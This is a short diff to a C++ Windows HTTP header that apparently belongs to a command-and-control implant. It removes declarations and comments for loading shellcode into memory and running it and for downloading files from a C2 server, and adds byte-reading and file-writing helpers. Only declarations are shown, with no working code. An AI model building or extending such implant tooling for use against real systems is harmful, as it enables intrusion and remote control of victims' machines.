@@ -5,6 +5,7 @@
 #include <winhttp.h>
 #include <string>
 #include <tlhelp32.h>
+#include <vector>
 #include "core/stdout.hpp"
 #include "core/utils.hpp"
 
@@ -49,15 +50,8 @@ namespace System::Http
         LPVOID lpData,
         DWORD dwDataLength
     );
-
-    // It's used for reading large data from responses.
-    // The data is saved at 'outFile'.
-    BOOL ReadResponseData(HINTERNET hRequest, const std::wstring& outFile);
-
-    // It's used for loading shellcode into memory and run.
-    BOOL ReadResponseShellcode(HINTERNET hRequest);
-
-    // Download a file from the C2 server
+    std::vector<BYTE> ReadResponseBytes(HINTERNET hRequest);
+    BOOL WriteResponseData(HINTERNET hRequest, const std::wstring& outFile);
     BOOL DownloadFile(
         HINTERNET hConnect,
         LPCWSTR lpHost,
